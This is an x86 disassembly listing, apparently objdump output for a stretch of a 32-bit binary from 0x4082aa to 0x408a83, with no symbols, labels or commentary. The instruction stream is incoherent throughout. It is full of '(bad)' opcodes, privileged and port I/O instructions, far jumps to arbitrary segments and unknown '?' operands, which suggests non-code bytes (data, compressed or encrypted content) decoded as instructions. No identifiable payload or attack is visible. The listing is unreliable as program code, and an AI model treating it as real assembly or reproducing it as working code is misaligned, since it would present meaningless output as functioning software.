  4082aa:	push   ebp
  4082ab:	pop    edx
  4082ac:	ror    DWORD PTR [ebp-0x7a],cl
  4082af:	fistp  DWORD PTR [edi+0x41b9a137]
  4082b5:	mov    bh,0x7e
  4082b7:	(bad)  
  4082b8:	enter  0x78ed,0x6d
  4082bc:	push   esp
  4082bd:	ins    BYTE PTR es:[edi],dx
  4082be:	cmp    al,0xef
  4082c0:	rcr    DWORD PTR [ebx],0x77
  4082c3:	loope  0x4082c0
  4082c5:	push   esi
  4082c6:	js     0x4082d2
  4082c8:	fmulp  st(5),st
  4082ca:	loopne 0x4082e7
  4082cc:	std    
  4082cd:	int3   
  4082ce:	jg     0x4082a5
  4082d0:	aaa    
  4082d1:	push   edx
  4082d2:	out    dx,eax
  4082d3:	or     eax,0xc93a1e51
  4082d8:	push   edx
  4082d9:	loope  0x4082a8
  4082db:	lods   eax,DWORD PTR ds:[esi]
  4082dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082dd:	hlt    
  4082de:	ja     0x408309
  4082e0:	dec    ebp
  4082e1:	int    0xc6
  4082e3:	fld    QWORD PTR ds:0x3f3814df
  4082e9:	xchg   esi,eax
  4082ea:	sahf   
  4082eb:	lea    ebp,[ebp+ebp*2-0xf]
  4082ef:	mov    esi,edx
  4082f1:	into   
  4082f2:	fdivrp st(4),st
  4082f4:	data16 out 0xb1,al
  4082f7:	adc    BYTE PTR [ebx+0x60d18273],al
  4082fd:	jecxz  0x4082fe
  4082ff:	retf   0xb00c
  408302:	mov    dl,0x25
  408304:	push   0x2
  408306:	sbb    BYTE PTR [ecx+edx*1-0x4c],0x3f
  40830b:	inc    eax
  40830c:	dec    ebp
  40830d:	leave  
  40830e:	int    0x92
  408310:	clc    
  408311:	pop    ebp
  408312:	mov    ecx,0x94ce3e70
  408317:	jb     0x4082bc
  408319:	mov    esp,0x7dac0e69
  40831e:	bnd jno 0x40838f
  408321:	enter  0x857d,0xd2
  408325:	cdq    
  408326:	jae    0x40839e
  408328:	aam    0xcb
  40832a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40832b:	mov    eax,edi
  40832d:	adc    DWORD PTR [eax],0x4b62998a
  408333:	mov    dl,0xfe
  408335:	mov    esp,0xc24de83f
  40833a:	test   eax,0xd23f0946
  40833f:	ret    
  408340:	or     BYTE PTR [ebx],al
  408342:	and    DWORD PTR [eax+0x193ecaf],esi
  408348:	stc    
  408349:	aas    
  40834a:	jecxz  0x40833f
  40834c:	adc    al,0xcf
  40834e:	fwait
  40834f:	mov    esp,cs
  408351:	aas    
  408352:	fld    DWORD PTR [ebp-0x128a20e0]
  408358:	mov    eax,0x19b2bbaa
  40835d:	out    dx,al
  40835e:	(bad)  
  40835f:	outs   dx,DWORD PTR ds:[esi]
  408360:	push   edi
  408361:	out    0x85,al
  408363:	neg    BYTE PTR [eax+0x4ce12516]
  408369:	sub    BYTE PTR fs:[ecx],dl
  40836c:	xchg   edx,eax
  40836d:	outs   dx,DWORD PTR ds:[esi]
  40836e:	push   0xffffff8e
  408370:	fs in  eax,dx
  408372:	sub    al,0xc4
  408374:	xchg   ebp,eax
  408375:	inc    ecx
  408376:	into   
  408377:	mov    cl,0x51
  408379:	iret   
  40837a:	sar    BYTE PTR [edx],cl
  40837c:	dec    BYTE PTR [ecx+0x556eeb07]
  408382:	test   eax,0x2ec21ec5
  408387:	loopne 0x408399
  408389:	loope  0x4083f5
  40838b:	mov    edi,DWORD PTR [eax-0x7f]
  40838e:	xcrypt-ctr (bad)
  40838f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408390:	sbb    esi,DWORD PTR [ebp-0x14ea6245]
  408396:	fs int 0xc5
  408399:	fist   WORD PTR [eax+0x6b]
  40839c:	sbb    BYTE PTR [ecx],0xe0
  40839f:	arpl   cx,si
  4083a1:	bswap  ebx
  4083a3:	neg    DWORD PTR [ebx]
  4083a5:	data16 xchg dx,ax
  4083a8:	jge    0x40834f
  4083aa:	mov    DWORD PTR [ecx+ebx*1+0x3a],ebx
  4083ae:	bound  edx,QWORD PTR [esi+0x38]
  4083b1:	cmp    BYTE PTR [edx+0x52],bh
  4083b4:	das    
  4083b5:	in     al,0xb7
  4083b7:	leave  
  4083b8:	jmp    0xb9b1e82f
  4083bd:	xchg   edx,eax
  4083be:	and    al,0x27
  4083c0:	rcr    DWORD PTR [ecx+eax*2+0x6e],cl
  4083c4:	mov    edx,0x61bd65b7
  4083c9:	push   esi
  4083ca:	sbb    BYTE PTR [ebx+0x67],ch
  4083cd:	jg     0x408388
  4083cf:	call   0x45ca80bb
  4083d4:	cmp    BYTE PTR [ebp+0x1bb1a806],dh
  4083da:	ret    
  4083db:	fxam   
  4083dd:	fsub   DWORD PTR [ebx-0x4b1bb1b]
  4083e3:	mov    edi,0x78c54f20
  4083e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083e9:	sub    BYTE PTR [esi+0x27cfe794],dh
  4083ef:	int    0x20
  4083f1:	mov    al,ds:0xaa05b4ad
  4083f6:	mov    WORD PTR [ebx],?
  4083f8:	ficom  DWORD PTR [edi-0x56]
  4083fb:	or     al,0x65
  4083fd:	int    0x27
  4083ff:	push   eax
  408400:	ret    0xa7af
  408403:	mov    dh,0x36
  408405:	sub    ebx,edi
  408407:	rcl    ebp,1
  408409:	rep lods al,BYTE PTR ds:[esi]
  40840b:	pop    edi
  40840c:	mov    edx,0x994ff4f8
  408411:	cld    
  408412:	push   ecx
  408413:	and    edx,DWORD PTR ds:0xa33d8c81
  408419:	sbb    BYTE PTR [eax*4+0x7bc8078f],bl
  408420:	sub    bl,BYTE PTR [edi-0x109234ac]
  408426:	sub    eax,0x1c1d2af3
  40842b:	mov    cl,BYTE PTR [ecx-0x214b964a]
  408431:	and    eax,0x11a6bf26
  408436:	pop    es
  408437:	push   ds
  408438:	push   ebp
  408439:	jne    0x408437
  40843b:	repnz mov bl,0xd4
  40843e:	ror    esi,0x9e
  408441:	fwait
  408442:	adc    BYTE PTR ds:0xcdc414a9,0x3b
  408449:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40844a:	in     eax,0x6e
  40844c:	in     al,0xcf
  40844e:	dec    edi
  40844f:	sub    DWORD PTR [edi+0x2e38f132],0x36
  408456:	(bad)  
  408457:	retf   
  408458:	ror    BYTE PTR [edx],0x5
  40845b:	sar    ebp,1
  40845d:	pushf  
  40845e:	push   ss
  40845f:	cmp    BYTE PTR [esi+0x38],dl
  408462:	cwde   
  408463:	int3   
  408464:	es jmp 0x79ff2f37
  40846a:	mov    bh,0xc0
  40846c:	push   ebx
  40846d:	pusha  
  40846e:	call   0x30ff845d
  408473:	repz xor edi,DWORD PTR [eax+ebp*2-0x7f]
  408478:	icebp  
  408479:	mov    DWORD PTR [edi+edx*8+0x0],edi
  40847d:	pop    ebp
  40847e:	test   eax,0xe1f93a16
  408483:	out    dx,al
  408484:	loopne 0x408460
  408486:	pop    ds
  408487:	stos   BYTE PTR es:[edi],al
  408488:	int    0xca
  40848a:	mov    ebp,DWORD PTR [ebx+ebx*4-0x69]
  40848e:	xchg   ebx,eax
  40848f:	lods   eax,DWORD PTR ds:[esi]
  408490:	mov    bl,0x15
  408492:	clc    
  408493:	sbb    eax,0xd82fe9e4
  408498:	mov    cl,0x4
  40849a:	fst    DWORD PTR [ecx]
  40849c:	rcl    DWORD PTR [ecx+0x397e8856],1
  4084a2:	arpl   bp,bp
  4084a4:	and    al,0x6c
  4084a6:	iret   
  4084a7:	mov    edx,0xd21a43e0
  4084ac:	jp     0x408481
  4084ae:	sub    edi,DWORD PTR [eax+0x60]
  4084b1:	jmp    0x3aa:0x886aab73
  4084b8:	xor    ebx,DWORD PTR [edx]
  4084ba:	mov    ah,0xd9
  4084bc:	jg     0x40848f
  4084be:	dec    edi
  4084bf:	ficomp WORD PTR [edx*4-0x53bb0068]
  4084c6:	pop    ecx
  4084c7:	jnp    0x408530
  4084c9:	in     eax,0x62
  4084cb:	xchg   ecx,eax
  4084cc:	jp     0x4084bc
  4084ce:	jmp    0x8361:0xe0b8e644
  4084d5:	pushf  
  4084d6:	lods   al,BYTE PTR ds:[esi]
  4084d7:	push   ds
  4084d8:	xor    BYTE PTR [edx-0x16387e8d],ah
  4084de:	loopne 0x4084ad
  4084e0:	test   DWORD PTR [edx-0x36],ebx
  4084e3:	shr    BYTE PTR [ebx-0x5617fa5a],0x15
  4084ea:	pop    ebp
  4084eb:	add    ebp,esp
  4084ed:	sbb    al,bh
  4084ef:	inc    ebp
  4084f0:	xor    ecx,DWORD PTR [edx+0x5ee06a3b]
  4084f6:	pop    esi
  4084f7:	js     0x4084e7
  4084f9:	jno    0x408488
  4084fb:	cli    
  4084fc:	mov    al,ds:0xb11c9725
  408501:	retf   0x17b9
  408504:	call   0xceda2e68
  408509:	sbb    BYTE PTR fs:[esp+ebx*2],bh
  40850d:	inc    edx
  40850e:	cmp    dh,ch
  408510:	add    edx,DWORD PTR [ecx]
  408512:	test   eax,0x2844113e
  408517:	push   esp
  408518:	add    BYTE PTR [edi+0x5b516252],bh
  40851e:	xor    eax,0x2434c91d
  408523:	dec    ebp
  408524:	mov    ah,0x7d
  408526:	inc    ecx
  408527:	jp     0x40851a
  408529:	sub    BYTE PTR [edi],dh
  40852b:	inc    edi
  40852c:	adc    ah,BYTE PTR [esi+esi*2-0x44d302fc]
  408533:	arpl   WORD PTR [eax],dx
  408535:	stos   DWORD PTR es:[edi],eax
  408536:	das    
  408537:	es test eax,0xf8eb800
  40853d:	mov    ah,0x6d
  40853f:	mov    ds:0x69b825dd,eax
  408544:	mov    eax,ds:0x147f9427
  408549:	pop    esp
  40854a:	bound  esi,QWORD PTR [edx]
  40854c:	push   esp
  40854d:	push   ebx
  40854e:	mov    ds:0xa60d5ad0,al
  408553:	rcr    DWORD PTR [ebx+esi*4+0x4e],cl
  408557:	mov    al,0x82
  408559:	mov    al,ds:0x830a7d6d
  40855e:	ss scas eax,DWORD PTR es:[edi]
  408560:	ss stos BYTE PTR es:[edi],al
  408562:	cmp    bh,0x70
  408565:	std    
  408566:	and    eax,0xbbe2ff94
  40856b:	sub    al,0xe4
  40856d:	mov    ?,edx
  40856f:	add    BYTE PTR [edi+0x10234751],bh
  408575:	mov    DWORD PTR [esi],edi
  408577:	ins    BYTE PTR es:[edi],dx
  408578:	sub    DWORD PTR [ebx+0x2e],ecx
  40857b:	sti    
  40857c:	add    BYTE PTR [ebp+0x14cc0b6b],bh
  408582:	and    eax,0x320e16b0
  408587:	xor    ebp,edi
  408589:	xor    DWORD PTR ds:0xab3877e8,0x31
  408590:	fwait
  408591:	push   esi
  408592:	lds    ecx,FWORD PTR [ebx+0x38]
  408595:	stos   DWORD PTR es:[edi],eax
  408596:	sub    dh,BYTE PTR [esi+ebx*4+0x2b48992f]
  40859d:	stc    
  40859e:	xor    al,0x51
  4085a0:	fdiv   DWORD PTR [eax+0x47]
  4085a3:	sub    bh,BYTE PTR [edi-0x22e6a765]
  4085a9:	push   cs
  4085aa:	cli    
  4085ab:	xor    dl,BYTE PTR [eax+eiz*1+0x5b]
  4085af:	test   al,al
  4085b1:	dec    esi
  4085b2:	push   ecx
  4085b3:	es iret 
  4085b5:	jbe    0x4085b3
  4085b7:	dec    edi
  4085b8:	mov    al,0x83
  4085ba:	push   ecx
  4085bb:	and    DWORD PTR [edx+0x42e673c5],ebx
  4085c1:	sbb    edi,ebx
  4085c3:	test   BYTE PTR [ecx-0x1a],ah
  4085c6:	scas   eax,DWORD PTR es:[edi]
  4085c7:	rol    DWORD PTR ds:0xf1db817a,cl
  4085cd:	ins    BYTE PTR es:[edi],dx
  4085ce:	pop    ss
  4085cf:	fisubr DWORD PTR [eax-0x21]
  4085d2:	push   0xffffffd2
  4085d4:	(bad)  
  4085d6:	imul   eax,edi,0x3
  4085d9:	push   esi
  4085da:	push   es
  4085db:	(bad)  
  4085dc:	xor    eax,0xcedf94c0
  4085e1:	add    cl,dh
  4085e3:	mov    ebp,0x472679e4
  4085e8:	pop    esi
  4085e9:	mov    ah,0x1f
  4085eb:	sbb    BYTE PTR [ebx-0x6d638500],al
  4085f1:	push   ebp
  4085f2:	push   ss
  4085f3:	hlt    
  4085f4:	jne    0x408622
  4085f6:	(bad)  
  4085f7:	sti    
  4085f8:	cdq    
  4085f9:	mov    gs,WORD PTR [eax]
  4085fb:	fwait
  4085fc:	or     BYTE PTR [edx+eiz*8],bl
  4085ff:	jnp    0x40862a
  408601:	(bad)  
  408602:	mov    bl,0x1b
  408604:	push   ecx
  408605:	xor    DWORD PTR [ebx],0x2
  408608:	(bad)  
  408609:	aam    0x1e
  40860b:	pop    eax
  40860c:	push   cs
  40860d:	ret    
  40860e:	shr    DWORD PTR [esi+0x21dafcb8],0xa2
  408615:	dec    ebx
  408616:	pop    edx
  408617:	lds    ebp,FWORD PTR ds:0x2ea68528
  40861d:	cli    
  40861e:	jmp    0x40e6:0x552913e6
  408625:	call   DWORD PTR [edi+0x4e]
  408628:	push   ebx
  408629:	pop    ecx
  40862a:	ja     0x408693
  40862c:	add    BYTE PTR [edx-0x57],al
  40862f:	push   esi
  408630:	push   ebp
  408631:	or     al,0xcf
  408633:	aam    0xb9
  408635:	adc    bl,dl
  408637:	push   ecx
  408638:	xor    eax,0x5a8bd271
  40863d:	inc    edi
  40863e:	fstp   DWORD PTR [edi-0x67]
  408641:	mov    dl,0x7d
  408643:	jno    0x408607
  408645:	add    ebx,edx
  408647:	jo     0x408680
  408649:	mov    esp,0x976bed69
  40864e:	jne    0x408688
  408650:	xor    edx,eax
  408652:	sbb    BYTE PTR [edi],0xd8
  408655:	mov    esi,?
  408657:	jecxz  0x40869c
  408659:	fadd   st(1),st
  40865b:	adc    cl,BYTE PTR [edi+0x4c36a375]
  408661:	mov    dh,0x4e
  408663:	lds    ecx,FWORD PTR [ebx+esi*8-0x3c]
  408667:	test   DWORD PTR [esi+0x3edee4d6],esp
  40866d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40866e:	and    DWORD PTR [esi+0x5c],ebp
  408671:	ret    
  408672:	push   cs
  408673:	shl    DWORD PTR [ebp-0x27],1
  408676:	and    DWORD PTR [ebx],ebp
  408678:	call   0x7d95:0xb2e5be7b
  40867f:	jp     0x408633
  408681:	(bad)  
  408683:	xchg   ecx,eax
  408684:	pop    edx
  408685:	cmp    ah,bl
  408687:	lahf   
  408688:	xlat   BYTE PTR ds:[ebx]
  408689:	ds and ebp,esp
  40868c:	cmp    BYTE PTR [ebx-0x2e],bh
  40868f:	xchg   esi,eax
  408690:	retf   0xebc4
  408693:	dec    ebp
  408694:	ins    DWORD PTR es:[edi],dx
  408695:	retf   
  408696:	inc    ecx
  408697:	inc    esi
  408698:	push   esp
  408699:	mov    DWORD PTR [edi+0xf],ecx
  40869c:	mov    bl,0xd8
  40869e:	or     al,0x6e
  4086a0:	jle    0x408684
  4086a2:	xchg   ebp,eax
  4086a3:	mov    esi,0x19dd3a1f
  4086a8:	xor    eax,0xc66742bd
  4086ad:	mov    ds:0x6cfa45c9,al
  4086b2:	pop    esp
  4086b3:	or     al,0xe2
  4086b5:	inc    ebx
  4086b6:	cmp    eax,0xbb8d4b3e
  4086bb:	push   edi
  4086bc:	add    eax,0x81292562
  4086c1:	int    0xf9
  4086c3:	mov    ds:0x22361717,al
  4086c8:	jp     0x408662
  4086ca:	cs ins BYTE PTR es:[edi],dx
  4086cc:	je     0x40871f
  4086ce:	jmp    0x388011a8
  4086d3:	xor    BYTE PTR [esi+0x5],bl
  4086d6:	daa    
  4086d7:	scas   eax,DWORD PTR es:[edi]
  4086d8:	mov    al,ds:0x81d5119b
  4086dd:	scas   al,BYTE PTR es:[edi]
  4086de:	xchg   ebp,eax
  4086df:	ja     0x408726
  4086e1:	adc    eax,0xfb3da5bc
  4086e6:	dec    ebp
  4086e7:	rcl    BYTE PTR [eax-0x3f2c945f],0xbd
  4086ee:	xor    edi,ecx
  4086f0:	pushf  
  4086f1:	sbb    bl,BYTE PTR [edx]
  4086f3:	(bad)  
  4086f4:	int3   
  4086f5:	mov    bh,0xc7
  4086f7:	js     0x40870d
  4086f9:	shl    DWORD PTR [esi],1
  4086fb:	cmp    esi,DWORD PTR [edx+0x2916508f]
  408701:	call   0xae6d:0x7cc6779d
  408708:	ss mov ebx,0x9cb3b9c9
  40870e:	in     al,dx
  40870f:	gs enter 0x3802,0x9a
  408714:	mov    esp,0x5e81de32
  408719:	xchg   ebx,eax
  40871a:	ss div ebx
  40871d:	pop    eax
  40871e:	jns    0x4086de
  408720:	cs pop edi
  408722:	scas   eax,DWORD PTR es:[edi]
  408723:	outs   dx,DWORD PTR ds:[esi]
  408724:	ss call 0xf329:0xa1ac03e4
  40872c:	mov    edx,0x506f1eec
  408731:	in     eax,dx
  408732:	leave  
  408733:	mov    esi,0x32ca4b11
  408738:	dec    edx
  408739:	jbe    0x40873e
  40873b:	mov    edx,0xca45b1f8
  408740:	mov    eax,ds:0x62b4a52b
  408745:	push   ebp
  408746:	add    esp,edx
  408748:	xchg   BYTE PTR [edi+eiz*8],cl
  40874b:	loope  0x40870f
  40874d:	inc    ecx
  40874e:	popa   
  40874f:	and    al,0x50
  408751:	clc    
  408752:	and    esp,ebp
  408754:	push   cs
  408755:	cmp    al,BYTE PTR [ebp-0x465985b]
  40875b:	outs   dx,BYTE PTR ds:[esi]
  40875c:	mov    esp,0x84db1215
  408761:	or     eax,0x945b7e56
  408766:	mov    ds:0x8ada6970,eax
  40876b:	lods   eax,DWORD PTR ds:[esi]
  40876c:	cdq    
  40876d:	push   eax
  40876e:	sahf   
  40876f:	fwait
  408770:	jmp    0x69df:0xeaf99a22
  408777:	dec    eax
  408778:	jbe    0x4087c7
  40877a:	ja     0x408717
  40877c:	and    dh,BYTE PTR [ecx]
  40877e:	lods   eax,DWORD PTR ds:[esi]
  40877f:	inc    edi
  408780:	retf   0x7edd
  408783:	call   0xf8f0ef53
  408788:	ret    
  408789:	ja     0x4087d2
  40878b:	sbb    BYTE PTR [ebx+0x7d01b69e],al
  408791:	repz cs push edx
  408794:	jp     0x408783
  408796:	inc    esp
  408797:	lea    edi,[edi]
  408799:	sub    edx,DWORD PTR [edi+0x442b18ef]
  40879f:	pop    edx
  4087a0:	or     eax,0xf46b0404
  4087a5:	popf   
  4087a6:	int3   
  4087a7:	adc    DWORD PTR [esi+0x78d2a35c],eax
  4087ad:	xor    eax,0x22504ef3
  4087b2:	mov    ebp,DWORD PTR [eax]
  4087b4:	icebp  
  4087b5:	pop    edx
  4087b6:	(bad)  
  4087b7:	test   ecx,0xdfee6bd0
  4087bd:	mul    DWORD PTR [eax]
  4087bf:	and    al,0x8
  4087c1:	jno    0x408828
  4087c3:	cmp    dh,BYTE PTR [esi+0x1013939b]
  4087c9:	inc    esp
  4087ca:	aad    0xc0
  4087cc:	scas   eax,DWORD PTR es:[edi]
  4087cd:	mov    ch,0x34
  4087cf:	xchg   edx,eax
  4087d0:	adc    BYTE PTR [ebx+0x5d1992a4],al
  4087d6:	add    ecx,ebp
  4087d8:	in     al,0x1f
  4087da:	push   ss
  4087db:	xchg   ebx,eax
  4087dc:	inc    edi
  4087dd:	(bad)  
  4087de:	loope  0x408772
  4087e0:	xor    BYTE PTR [eax+0xe],0x87
  4087e4:	pop    ebx
  4087e5:	sub    eax,0xf8a02b6e
  4087ea:	jmp    0xfbc59d4f
  4087ef:	jno    0x4087e4
  4087f1:	pop    ds
  4087f2:	jae    0x40878e
  4087f4:	mov    dh,0xdb
  4087f6:	add    edx,DWORD PTR [ebp+edx*2-0x9]
  4087fa:	xchg   ecx,eax
  4087fb:	pop    eax
  4087fc:	mov    BYTE PTR [ecx+0x13df7c3a],bh
  408802:	test   eax,0x6e6281bb
  408807:	mov    eax,0x816871b1
  40880c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40880d:	inc    ebx
  40880e:	sbb    DWORD PTR [ebx],esi
  408810:	xchg   edi,eax
  408811:	aaa    
  408812:	mov    esi,0xaf90a20
  408817:	jg     0x408837
  408819:	mov    cl,0xa8
  40881b:	paddq  mm3,QWORD PTR [ebp-0x5c]
  40881f:	ror    DWORD PTR [ecx+0x42ee1499],1
  408825:	jns    0x4087fa
  408827:	xor    BYTE PTR [esi+0x42],bh
  40882a:	out    dx,eax
  40882b:	enter  0x78bc,0xe9
  40882f:	jo     0x408893
  408831:	add    eax,edi
  408833:	divps  xmm1,XMMWORD PTR [ebp-0x5d]
  408837:	push   cs
  408838:	mov    ebx,0xb08c2abf
  40883d:	add    ch,BYTE PTR [eax]
  40883f:	sbb    esp,0xf6736b0b
  408845:	inc    eax
  408846:	mov    ds:0x56dff3f9,al
  40884b:	jb     0x4088c2
  40884d:	shl    dh,0xe
  408850:	ror    DWORD PTR ds:0x28ff0461,cl
  408856:	pop    esp
  408857:	jno    0x408809
  408859:	imul   esp,edx,0x42
  40885c:	push   esi
  40885d:	aaa    
  40885e:	jbe    0x408897
  408860:	pop    ds
  408861:	aam    0xd1
  408863:	mov    bl,0xcd
  408865:	cld    
  408866:	push   cs
  408867:	ret    
  408868:	cmp    DWORD PTR [esi-0x76],ebx
  40886b:	sbb    al,0x79
  40886d:	les    esp,FWORD PTR [esi+0x79579b75]
  408873:	dec    esp
  408874:	outs   dx,DWORD PTR ds:[esi]
  408875:	dec    ebx
  408876:	sbb    eax,0xa5dc042b
  40887b:	dec    ebp
  40887c:	xlat   BYTE PTR ds:[ebx]
  40887d:	sub    al,0xfc
  40887f:	jmp    0x7dbfe4dc
  408884:	adc    BYTE PTR [eax+eiz*8],al
  408887:	sub    BYTE PTR [edi],ch
  408889:	out    0x7b,al
  40888b:	mov    edx,0x392c9a97
  408890:	mov    al,0xf5
  408892:	xor    BYTE PTR [esi-0x1d6a1d18],bl
  408898:	adc    esp,0xc879ebf9
  40889e:	xchg   ecx,eax
  40889f:	and    BYTE PTR es:[eax+0x19],ch
  4088a3:	sahf   
  4088a4:	retf   0x6590
  4088a7:	loope  0x408873
  4088a9:	clc    
  4088aa:	dec    ecx
  4088ab:	leave  
  4088ac:	adc    DWORD PTR [edi+0x7ec5069f],edx
  4088b2:	pop    esp
  4088b3:	rcl    BYTE PTR ds:0xfaa1caef,1
  4088b9:	push   eax
  4088ba:	jae    0x408875
  4088bc:	adc    al,BYTE PTR [edx-0x68]
  4088bf:	data16 mov ch,0x75
  4088c2:	push   edx
  4088c3:	outs   dx,BYTE PTR ds:[esi]
  4088c4:	mov    dl,0x9
  4088c6:	(bad)  
  4088c7:	ror    DWORD PTR [esi+edi*1],cl
  4088ca:	mov    ch,dh
  4088cc:	push   ds
  4088cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088ce:	jno    0x4088e9
  4088d0:	sub    cl,0x93
  4088d3:	out    0x87,eax
  4088d5:	xchg   DWORD PTR [ebx+0xa],eax
  4088d8:	(bad)  
  4088da:	sbb    al,0x7c
  4088dc:	ins    DWORD PTR es:[edi],dx
  4088dd:	pop    ds
  4088de:	sub    al,0x59
  4088e0:	dec    eax
  4088e1:	cdq    
  4088e2:	in     al,0xb7
  4088e4:	out    0x4d,al
  4088e6:	mov    ah,0xb5
  4088e8:	mov    ds:0xb2d922f3,al
  4088ed:	int3   
  4088ee:	inc    edx
  4088ef:	test   bh,dl
  4088f1:	iret   
  4088f2:	ja     0x408937
  4088f4:	ja     0x408911
  4088f6:	aam    0x8f
  4088f8:	mov    ds:0x28b202f4,al
  4088fd:	in     eax,dx
  4088fe:	into   
  4088ff:	and    eax,ebp
  408901:	xlat   BYTE PTR ds:[ebx]
  408902:	fsub   st,st(3)
  408904:	arpl   WORD PTR [edx+0x20],bp
  408907:	imul   eax,edx,0xce3ccdf3
  40890d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40890e:	cmp    DWORD PTR [edx+0x18],edx
  408911:	jmp    0xc8f0:0xeebdd439
  408918:	cs cmp esp,ebp
  40891b:	and    eax,0xffce13e0
  408920:	fnstcw WORD PTR [esi*8-0x7bf88f29]
  408927:	outs   dx,DWORD PTR ds:[esi]
  408928:	repz stc 
  40892a:	dec    ebp
  40892b:	inc    ebx
  40892c:	cmp    eax,DWORD PTR [edx+0x3c]
  40892f:	loopne 0x40890d
  408931:	fiadd  DWORD PTR [esi-0x223193f5]
  408937:	push   ebx
  408938:	push   edx
  408939:	es jnp 0x4088be
  40893c:	sbb    DWORD PTR ds:0xe6a61391,edi
  408942:	test   al,0x70
  408944:	pop    esi
  408945:	xor    al,0x3b
  408947:	sub    BYTE PTR [edi],cl
  408949:	pop    ss
  40894a:	cdq    
  40894b:	xor    DWORD PTR [ebp-0x5d],eax
  40894e:	lods   al,BYTE PTR ds:[esi]
  40894f:	dec    esi
  408950:	jmp    0x408964
  408952:	add    ah,BYTE PTR [edx]
  408954:	jns    0x40895e
  408956:	xchg   edi,eax
  408957:	lods   eax,DWORD PTR ds:[esi]
  408958:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408959:	lods   eax,DWORD PTR ds:[esi]
  40895a:	mov    bh,BYTE PTR [edx]
  40895c:	sbb    DWORD PTR [ecx+eax*4+0x26],eax
  408960:	inc    edx
  408961:	pop    ebp
  408962:	jg     0x4088ef
  408964:	mov    edi,0xc54a105
  408969:	mov    edi,0x3bfd0efa
  40896e:	pusha  
  40896f:	scas   eax,DWORD PTR es:[edi]
  408970:	cs test al,0x8b
  408973:	fnstcw WORD PTR [esi+0x590aa31f]
  408979:	mov    dl,0x67
  40897b:	cld    
  40897c:	cmp    cl,bh
  40897e:	cmp    cl,ch
  408980:	dec    ecx
  408981:	or     DWORD PTR [eax+0x7a1c317d],esi
  408987:	inc    esp
  408988:	or     eax,0x6cea88ad
  40898d:	jb     0x408986
  40898f:	jg     0x4089e4
  408991:	sub    cl,BYTE PTR [edi+0x7d]
  408994:	clc    
  408995:	cwde   
  408996:	ja     0x4089bb
  408998:	sub    ebx,ebp
  40899a:	add    DWORD PTR [edi+0x66],edx
  40899d:	jbe    0x408961
  40899f:	mov    WORD PTR [edx+0x73],es
  4089a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089a3:	mov    edi,0x1ed25561
  4089a8:	(bad)  
  4089a9:	ja     0x4089ce
  4089ab:	je     0x408931
  4089ad:	dec    edx
  4089ae:	adc    DWORD PTR [ebp+0x52],esp
  4089b1:	jle    0x4089f6
  4089b3:	lahf   
  4089b4:	nop
  4089b5:	adc    bh,BYTE PTR [ecx-0x27eb4d15]
  4089bb:	aad    0xcf
  4089bd:	inc    edx
  4089be:	xchg   esp,edi
  4089c0:	mov    bh,0x63
  4089c2:	out    dx,al
  4089c3:	and    BYTE PTR [esi],cl
  4089c5:	or     al,0xaf
  4089c7:	call   FWORD PTR [edi]
  4089c9:	push   ecx
  4089ca:	sti    
  4089cb:	xchg   esi,eax
  4089cc:	add    ch,dh
  4089ce:	adc    al,0xd4
  4089d0:	push   esp
  4089d1:	bound  edi,QWORD PTR [ebp-0x1145e4a8]
  4089d7:	inc    esi
  4089d8:	sbb    ebp,DWORD PTR [edx]
  4089da:	enter  0x1376,0xe2
  4089de:	inc    ebx
  4089df:	icebp  
  4089e0:	mov    edx,DWORD PTR [eax]
  4089e2:	xor    ah,dh
  4089e4:	sub    dh,BYTE PTR [ebp+0x4d]
  4089e7:	ds sbb esp,ecx
  4089ea:	pop    ecx
  4089eb:	pop    esi
  4089ec:	je     0x408a6d
  4089ee:	imul   edi,DWORD PTR [edi+0x5c12ba6f],0x1f
  4089f5:	add    ah,ah
  4089f7:	nop
  4089f8:	mov    ecx,0xbce0d679
  4089fd:	xchg   edx,eax
  4089fe:	sbb    al,0x8e
  408a00:	lods   al,BYTE PTR ds:[esi]
  408a01:	dec    esi
  408a02:	cld    
  408a03:	sub    al,0xa3
  408a05:	cld    
  408a06:	xchg   ebx,esi
  408a08:	xchg   esi,eax
  408a09:	bound  eax,QWORD PTR [esp+esi*4+0x1ad619d7]
  408a10:	pop    eax
  408a11:	sbb    bl,ch
  408a13:	pop    ds
  408a14:	or     dl,BYTE PTR [esi-0x56]
  408a17:	cli    
  408a18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a19:	xor    eax,0xc8f3f656
  408a1e:	sub    DWORD PTR [si],edx
  408a21:	das    
  408a22:	les    edx,FWORD PTR [edx+edi*8]
  408a25:	jmp    0xc12f:0x1fd5178d
  408a2c:	inc    eax
  408a2d:	xor    ebx,ebp
  408a2f:	mov    ds:0xb6fabba7,eax
  408a34:	rcr    BYTE PTR [edx-0x35105bb9],1
  408a3a:	neg    DWORD PTR [ecx+eiz*4+0x28]
  408a3e:	pusha  
  408a3f:	rcr    edx,1
  408a41:	dec    ebp
  408a42:	pop    eax
  408a43:	mov    ch,BYTE PTR [eax+0x48e40d1]
  408a49:	jmp    0xa63f:0x8ebaa024
  408a50:	or     eax,0x16ac9326
  408a55:	cmp    bh,ch
  408a57:	sbb    ecx,DWORD PTR ds:0x8505668f
  408a5d:	cli    
  408a5e:	js     0x408a97
  408a60:	lock lahf 
  408a62:	cmp    dh,dh
  408a64:	test   eax,0xcc0b1f51
  408a69:	not    DWORD PTR [edi+0x1f608528]
  408a6f:	icebp  
  408a70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a71:	fdiv   DWORD PTR [eax]
  408a73:	test   edi,edi
  408a75:	in     eax,dx
  408a76:	aas    
  408a77:	mov    al,0x3a
  408a79:	js     0x408ae7
  408a7b:	rol    ch,cl
  408a7d:	stos   DWORD PTR es:[edi],eax
  408a7e:	cld    
  408a7f:	push   edx
  408a80:	daa    
  408a81:	or     al,0x76
  408a83:	pop    ss
